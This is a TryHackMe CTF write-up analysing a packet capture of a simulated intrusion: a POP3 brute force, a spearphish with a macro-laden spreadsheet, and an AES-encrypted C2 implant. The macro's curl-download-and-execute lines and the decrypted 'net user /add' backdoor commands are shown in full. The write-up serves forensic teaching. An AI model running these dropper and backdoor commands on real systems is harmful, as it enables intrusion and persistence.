# TryHackMe — Pressed (Blue Team PCAP Analysis)

> **Difficulty:** Medium · **Category:** Blue Team / Network Forensics · **PCAP MD5:** `0d002785566...370c7`

## Overview

"Pressed" is a defensive blue-team room where we analyze a network traffic capture (`.pcapng`) to reconstruct a full attack chain and recover **three hidden flag parts**. The attack progresses through credential brute-forcing, spearphishing with a weaponized document, C2 implant deployment, and encrypted command-and-control communication.

### Attack Chain Summary

```
POP3 Brute-Force → Credential Theft → SMTP Spearphish (malicious ODS)
→ Victim opens macro → Downloads C2 implant (client.exe)
→ AES-256-CBC encrypted reverse shell on port 443
→ Reconnaissance + Backdoor account creation + Data exfiltration
```

### MITRE ATT&CK Mapping

| Technique | ID | Where |
|---|---|---|
| Brute Force: Password Guessing | T1110.001 | POP3 dictionary attack |
| Phishing: Spearphishing Attachment | T1566.001 | SMTP email with sheet.ods |
| Command and Scripting Interpreter | T1059.005 | LibreOffice Basic macro |
| Ingress Tool Transfer | T1105 | curl downloads client.exe |
| Encrypted Channel | T1573.001 | AES-256-CBC C2 on port 443 |
| Create Account: Local Account | T1136.001 | net user /add |
| Data from Local System | T1005 | clients.csv exfiltration |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `tshark` | PCAP analysis, protocol hierarchy, TCP stream follow, IMF/HTTP object export |
| `radare2` | Binary string extraction from PE `.rdata` section (AES key/IV recovery) |
| `Ghidra` | Full PE decompilation — C2 logic, AES mode confirmation |
| `CyberChef` | AES-256-CBC decryption of C2 traffic |
| `Python3` | MIME attachment extraction, AES decryption scripting (pycryptodome) |
| `Wireshark` | Optional GUI-based stream follow and raw export |

---

## Phase 1 — PCAP Reconnaissance

### 1.1 Verify Integrity & Protocol Overview

```bash
md5sum traffic.pcapng
# Expected: 0d002785566...370c7

tshark -r traffic.pcapng -q -z io,phs
```

**Protocol hierarchy results (6745 frames, ~3.8 MB):**

| Protocol | Frames | Significance |
|---|---|---|
| POP3 | 210 | Brute-force attack against mail accounts |
| SMTP | 40 (+1 IMF) | Attacker sent weaponized email |
| IMAP | 46 | Attacker monitored inbox after compromise |
| SMB2 | 173 | File sharing activity (dead end) |
| TLS | 18 | Encrypted traffic (no keys available) |
| HTTP | 1 | C2 implant download |
| DNS | 5 | Name resolution |

**Key insight:** Three mail protocols (POP3/SMTP/IMAP) + HTTP + encrypted traffic on port 443 — multiple channels to investigate.

### 1.2 Identify Participants

```bash
tshark -r traffic.pcapng -Y "pop" -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e pop.request.command -e pop.request.parameter | head -80
```

| Role | IP |
|---|---|
| Attacker | `10.13.44.207` |
| Mail server / Victim | `10.10.86.57` |

---

## Phase 2 — POP3 Brute-Force Analysis

### 2.1 Attack Pattern

The attacker launched a dictionary attack against `hazel@pressed.thm`:

```bash
tshark -r traffic.pcapng -Y "pop.request.command==PASS" -T fields \
  -e frame.number -e tcp.stream -e pop.request.parameter | head -30
```

**Observed passwords:** `daniel`, `pa*****d`, `jessica`, `123456`, `iloveyou`, `nicole`, `abc123`, `lovely`, `monkey`, `princess`, `babygirl`, `12345678`...

Multiple parallel TCP connections were opened (mass `USER` commands first), then `PASS` attempts sent across different streams.

### 2.2 Successful Login

```bash
# Identify which stream got +OK
tshark -r traffic.pcapng -q -z follow,tcp,ascii,1188
```

```
USER hazel@pressed.thm  → +OK
PASS pa*****d            → +OK Mailbox locked and ready
```

**Credentials found:** `hazel@pressed.thm` : `pa*****d` (frame 2508, TCP stream 1188).

**Important:** After successful login, the attacker issued **no RETR/LIST/STAT commands** — they only needed the password, not the emails.

### 2.3 Second Target

From frame 2546, the attacker switched to brute-forcing `smokey@pressed.thm` with the same dictionary. Stream 1202 shows `PASS daniel → -ERR` — **no successful login for smokey**.

---

## Phase 3 — SMTP Spearphishing Analysis

### 3.1 Locate the Email

```bash
tshark -r traffic.pcapng -Y "smtp" -T fields \
  -e frame.number -e ip.src -e smtp.req.command \
  -e smtp.req.parameter -e smtp.response.code | head -60
```

**SMTP session (stream 1205):**

| Step | Detail |
|---|---|
| AUTH LOGIN | Base64 credentials (stolen `hazel` creds) |
| MAIL FROM | `hazel@pressed.thm` |
| RCPT TO | `smokey@pressed.thm` |
| Subject | "Re: Urgent!" |
| Body | "HeRe You go" |
| Attachment | `sheet.ods` (OpenDocument Spreadsheet) |

The attacker impersonated hazel and sent a weaponized spreadsheet to smokey — a reply to smokey's earlier request for a spreadsheet.

### 3.2 Extract the Attachment

```bash
# Export IMF objects (email messages with attachments)
mkdir -p /tmp/imf_export
tshark -r traffic.pcapng --export-objects imf,/tmp/imf_export
ls /tmp/imf_export/
# Output: 'Re%3a Urgent!.eml'
```

> **Note:** tshark URL-encodes the colon in the filename (`%3a` instead of `:`).

```bash
# Extract ODS attachment from EML using Python
python3 -c "
import email
with open('/tmp/imf_export/Re%3a Urgent!.eml', 'rb') as f:
    msg = email.message_from_bytes(f.read())
for part in msg.walk():
    fn = part.get_filename()
    if fn:
        with open(f'/tmp/{fn}', 'wb') as out:
            out.write(part.get_payload(decode=True))
        print(f'Saved: /tmp/{fn}')
    elif part.get_content_type() == 'text/plain':
        print(f'Body: {part.get_payload(decode=True).decode()}')
"
# Output: Body: HeRe You go
#         Saved: /tmp/sheet.ods (3925 bytes)
```

### 3.3 Analyze the Malicious ODS

ODS files are ZIP archives. List contents:

```bash
unzip -l /tmp/sheet.ods
```

Key finding: `Basic/Standard/evil.xml` — an embedded LibreOffice Basic macro.

```bash
unzip -p /tmp/sheet.ods Basic/Standard/evil.xml
```

**Decoded macro (XML entities → readable):**

```vb
Shell("cmd /c echo VEhNe0FfQzJf****==")
Shell("cmd /c curl 10.13.44.207/client.exe -o C:\Users\Public\client.exe")
Shell("cmd /c C:\Users\Public\client.exe")
```

| Line | Action |
|---|---|
| 1 | Outputs base64-encoded **Flag Part 1** |
| 2 | Downloads C2 implant from attacker's server (dropper) |
| 3 | Executes the C2 implant |

### 🚩 Flag Part 1

```bash
echo 'VEhNe0FfQzJf****==' | base64 -d
# THM{A_C2_****_
```

---

## Phase 4 — C2 Implant Analysis

### 4.1 Locate the Download

```bash
tshark -r traffic.pcapng -Y "http" -T fields \
  -e frame.number -e tcp.stream -e http.request.method -e http.request.uri
# 2962  1207  GET  /client.exe
```

Frame 2962: victim (`10.10.86.57`) downloads `client.exe` from attacker (`10.13.44.207`) via HTTP on port 80.

### 4.2 Extract the Binary

**Method A — tshark raw payload extraction:**

```bash
# Extract server-side payload from stream 1207
tshark -r traffic.pcapng \
  -Y "tcp.stream==1207 && ip.src==10.13.44.207" \
  -T fields -e tcp.payload | tr -d '\n\r ' | xxd -r -p > /tmp/client_response.bin

# Strip HTTP headers (everything before MZ magic bytes)
python3 -c "
with open('/tmp/client_response.bin','rb') as f:
    data = f.read()
idx = data.find(b'MZ')
pe = data[idx:]
with open('/tmp/client.exe','wb') as out:
    out.write(pe)
print(f'PE size: {len(pe)} bytes')  # Expected: 10240
"
```

**Method B — Wireshark GUI:**

1. Open PCAP → Go to packet 2962 (`Ctrl+G`)
2. Right-click → Follow → TCP Stream
3. Switch display to **Raw**
4. Save As → `/tmp/client_raw.bin`
5. Remove bytes before `MZ` header (hex `4d5a`)

### 4.3 Static Analysis — Quick Method (radare2)

> **Lesson learned:** Always start with string extraction before launching a full decompiler. In CTFs, keys and secrets are almost always plaintext in `.rdata`.

```bash
r2 /tmp/client.exe
[0x...]> iz
```

**Critical strings found in `.rdata`:**

| Address | String | Purpose |
|---|---|---|
| `0x1401c3000` | `rhI1YazJ********` | AES key part 1 (16 bytes) |
| `0x1401c3020` | `VKf7EQIv********` | AES key part 2 (16 bytes) |
| `0x1401c3040` | `w8P3PU9k********` | AES IV (16 bytes) |
| `0x1401c30de` | `%s%s` | snprintf format (concatenates key parts) |
| `0x1401c30f5` | `10.13.44.207` | C2 server IP |
| `0x1401c30d8` | `popen` | Command execution method |

**Alternative extraction methods (no radare2):**

```bash
# Method 1: strings
strings -n 8 /tmp/client.exe

# Method 2: objdump
objdump -s -j .rdata /tmp/client.exe

# Method 3: Python + pefile
python3 -c "
import pefile, re
pe = pefile.PE('/tmp/client.exe')
for s in pe.sections:
    name = s.Name.decode().strip('\x00')
    if name == '.rdata':
        data = s.get_data()
        for m in re.finditer(rb'[\x20-\x7e]{6,}', data):
            print(f'0x{pe.OPTIONAL_HEADER.ImageBase + s.VirtualAddress + m.start():x}: {m.group().decode()}')
"
```

### 4.4 Full Decompilation (Ghidra)

For deeper understanding of the C2 logic:

```
Ghidra → Import client.exe → Analyze → Navigate to main()
```

**Decompiled main() logic:**

```c
// 1. Build AES key from two halves
snprintf(&key, 0x21, "%s%s", "rhI1YazJ********");
// key2 = "VKf7EQIv********" (assigned separately)

// 2. Connect to C2
socket(AF_INET, SOCK_STREAM, 0);
htons(0x1BB);                    // Port 443
inet_pton(2, "10.13.44.207", &addr);
connect(sock, &addr, 0x10);

// 3. Command loop
while (true) {
    recv(sock, buffer, 0x400, 0);           // Receive encrypted command
    aes_decrypt(buffer, len, plaintext, &out_len);  // Decrypt
    execute_command(plaintext, output, 0x1000);      // Execute via popen()
    aes_encrypt(output, len, ciphertext, &out_len);  // Encrypt response
    send(sock, ciphertext, out_len, 0);              // Send back
}
```

**`aes_decrypt` internals:**

```c
cipher = EVP_aes_256_cbc();  // Confirmed: AES-256-CBC
perform_decryption(ciphertext, len, plaintext, out_len, &key, &iv, cipher);
```

**Crypto parameters summary:**

| Parameter | Value | Source |
|---|---|---|
| Algorithm | AES-256-CBC | `EVP_aes_256_cbc()` |
| Key | `rhI1YazJ********VKf7EQIv********` (32 bytes) | `snprintf("%s%s", part1, part2)` |
| IV | `w8P3PU9k********` (16 bytes) | Separate global at `0x1401c3040` |

---

## Phase 5 — C2 Traffic Decryption

### 5.1 Identify the C2 Channel

```bash
# All streams on port 443
tshark -r traffic.pcapng -Y "tcp.port==443" -T fields \
  -e tcp.stream | sort -u
# Output: 12, 1206, 1208
```

| Stream | Purpose |
|---|---|
| 12 | Empty SYN (no data) |
| 1206 | TLS to external IP `89.238.68.201` (not C2) |
| **1208** | **Actual C2: victim ↔ attacker on port 443** |

> **Note:** Stream 1207 is HTTP port 80 (client.exe download) — NOT the C2 channel despite having 3766 frames.

### 5.2 Extract Encrypted Payloads

```bash
tshark -r traffic.pcapng -Y "tcp.stream==1208 && tcp.len>0" \
  -T fields -e frame.number -e ip.src -e tcp.payload
```

| Frame | Direction | Size | Hex Payload |
|---|---|---|---|
| 6728 | C2 → Victim | 16B | `fcc44520bbf8344c...` |
| 6729 | Victim → C2 | 32B | `0e0665eea66a4b8b...` |
| 6731 | C2 → Victim | 64B | `3ca57ff41ce61dd1...` |
| 6733 | Victim → C2 | 48B | `ad6113cc9a03f17b...` |
| 6735 | C2 → Victim | 64B | `fc7e8de2826e4a6a...` |
| 6736 | Victim → C2 | 48B | `bae2aeb06b8d5e8f...` |
| 6740 | C2 → Victim | 48B | *(extracted same way)* |
| 6741 | Victim → C2 | 496B | *(extracted same way)* |
| 6743 | C2 → Victim | 48B | *(extracted same way)* |
| 6744 | Victim → C2 | 848B | *(extracted same way)* |

### 5.3 Decrypt — CyberChef Method

**Recipe:** AES Decrypt → Key: `rhI1YazJ********VKf7EQIv********` (UTF8) → IV: `w8P3PU9k********` (UTF8) → Mode: CBC → Input: Hex → Output: Raw

Paste each hex payload as input.

### 5.4 Decrypt — Python Script Method

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii, subprocess

key = b"rhI1YazJ********VKf7EQIv********"  # 32 bytes
iv  = b"w8P3PU9k********"                   # 16 bytes

result = subprocess.run(
    ["tshark", "-r", "traffic.pcapng",
     "-Y", "tcp.stream==1208 && tcp.len>0",
     "-T", "fields", "-e", "frame.number",
     "-e", "ip.src", "-e", "tcp.payload"],
    capture_output=True, text=True
)

for line in result.stdout.strip().split("\n"):
    parts = line.split("\t")
    if len(parts) < 3:
        continue
    frame, src, phex = parts
    ct = binascii.unhexlify(phex.replace(":", ""))
    direction = "C2→Victim" if src == "10.13.44.207" else "Victim→C2"
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plain = unpad(cipher.decrypt(ct), AES.block_size)
        print(f"[Frame {frame}] {direction}: {plain.decode(errors='replace')}")
    except Exception as e:
        print(f"[Frame {frame}] {direction}: ERROR {e}")
```

> **Prerequisite:** `pip3 install pycryptodome --break-system-packages`

### 5.5 Decrypted C2 Session

| Frame | Direction | Decrypted Content |
|---|---|---|
| 6728 | C2 → Victim | `whoami` |
| 6729 | Victim → C2 | `administrator` |
| 6731 | C2 → Victim | `net user *** RWx1RDNf****== /add /Y` |
| 6733 | Victim → C2 | `completed successfully` |
| 6735 | C2 → Victim | `net localgroup administrators *** /add` |
| 6736 | Victim → C2 | `completed successfully` |
| 6740 | C2 → Victim | `dir C:\Users\Administrator\Desktop\` |
| 6741 | Victim → C2 | Directory listing (clients.csv, EC2 files) |
| 6743 | C2 → Victim | `type C:\Users\Administrator\Desktop\clients.csv` |
| 6744 | Victim → C2 | CSV contents — credit card data (see below) |

**Post-exploitation actions:**

1. **Reconnaissance** — `whoami` confirms SYSTEM/Administrator access
2. **Persistence** — Created backdoor local admin account (base64 password = flag part 2)
3. **Data Exfiltration** — Read `clients.csv` containing credit card numbers

### 5.6 Exfiltrated Data (clients.csv)

```csv
id,name,cards
1,Kristina,3576458480892700
2,Vincenz,6377289692238729
...
21,Morissa,QXJlX1By****==       ← Flag Part 3 disguised as card number
...
30,Michal,5462675671244662
```

Entry #21 (Morissa) contains a base64 string instead of a real credit card number.

---

## Flag Recovery

### 🚩 Flag Part 1 — Malicious Macro (evil.xml)

```bash
echo 'VEhNe0FfQzJf****==' | base64 -d
# THM{A_C2_****_
```

**Location:** Base64 string in `Shell("cmd /c echo ...")` inside `sheet.ods → Basic/Standard/evil.xml`

### 🚩 Flag Part 2 — Backdoor Account Password (C2 command)

```bash
echo 'RWx1RDNf****==' | base64 -d
# ****_Y0u_Wh3n_****_
```

**Location:** Password argument in `net user <username> <base64> /add /Y` sent as encrypted C2 command (frame 6731)

### 🚩 Flag Part 3 — Fake Credit Card Number (exfiltrated CSV)

```bash
echo 'QXJlX1By****==' | base64 -d
# Are_Pre****_4_Tim3}
```

**Location:** Entry #21 (Morissa) in `clients.csv`, disguised as a credit card number (frame 6744)

### Full Flag

```
THM{A_C2_****_EluD3_****_Wh3n_****_Are_****_4_Tim3}
```

---

## Full Attack Timeline

| Frame | Time | Protocol | Event |
|---|---|---|---|
| 2401–2479 | — | POP3 | Mass `USER hazel@pressed.thm` (parallel connections) |
| 2496–2527 | — | POP3 | Dictionary `PASS` attack (rockyou-style wordlist) |
| **2508** | — | POP3 | **Successful login** (`pa*****d`) |
| 2546–2700 | — | POP3 | Brute-force attempt on `smokey@pressed.thm` (failed) |
| 2823–2866 | — | IMAP | Login as hazel, SELECT INBOX (2 msgs), IDLE monitoring |
| 2884–2921 | — | SMTP | Spearphish email: hazel → smokey, attachment `sheet.ods` |
| **2962** | — | HTTP | Victim downloads `client.exe` (GET /client.exe, 10240 bytes) |
| 6725–6727 | — | TCP | C2 channel established (port 443, stream 1208) |
| **6728** | — | C2 | `whoami` → `administrator` |
| **6731** | — | C2 | Backdoor account created (flag part 2 in password) |
| **6735** | — | C2 | Backdoor added to Administrators group |
| **6740** | — | C2 | `dir Desktop` — reconnaissance |
| **6743–6744** | — | C2 | `type clients.csv` — data exfiltration (flag part 3) |

---

## Key Lessons

### Blue Team Analysis Methodology

```
1. Protocol hierarchy (io,phs)     → identify what's in the capture
2. Filter by protocol              → reconstruct sessions
3. Follow TCP streams              → read full conversations
4. Export objects (imf/http/smb)    → extract files and attachments
5. Static analysis of binaries     → extract keys, URLs, logic
6. Decrypt encrypted channels      → recover attacker commands
```

### Binary Analysis Priority

```
FAST (seconds):   strings / r2 iz / objdump -s -j .rdata  → keys, IPs, URLs
MEDIUM (minutes): CyberChef Strings / pefile Python        → structured extraction
SLOW (minutes):   Ghidra / Cutter / IDA                    → full decompilation
```

> **Rule: Data first, logic second.** CTF binaries almost always store secrets as plaintext strings in `.rdata` — extract arguments before reverse-engineering functions.

### Crypto Pitfalls

- Case sensitivity matters: `VKf7` vs `Vkf7` produces entirely different ciphertext
- The IV was a **separate third string** (`w8P3PU9k...`), not one of the key halves
- Always verify all three parameters: **key + IV + mode** before attempting decryption
- `radare2 iz` would have shown all three strings in seconds — avoiding the trial-and-error

### Flag Hiding Techniques

Flag parts were concealed in three different forensic layers:

1. **Application layer** — Inside a LibreOffice macro (requires ODS extraction + XML parsing)
2. **Network layer** — Inside encrypted C2 commands (requires binary RE + traffic decryption)
3. **Data layer** — Disguised as a credit card number in exfiltrated data (requires content analysis)

---

## References

- [MITRE ATT&CK — Spearphishing Attachment (T1566.001)](https://attack.mitre.org/techniques/T1566/001/)
- [tshark Documentation](https://www.wireshark.org/docs/man-pages/tshark.html)
- [CyberChef — AES Decrypt](https://gchq.github.io/CyberChef/)
- [Ghidra — NSA Reverse Engineering Framework](https://ghidra-sre.org/)
- [radare2 — Reverse Engineering Toolkit](https://rada.re/n/)
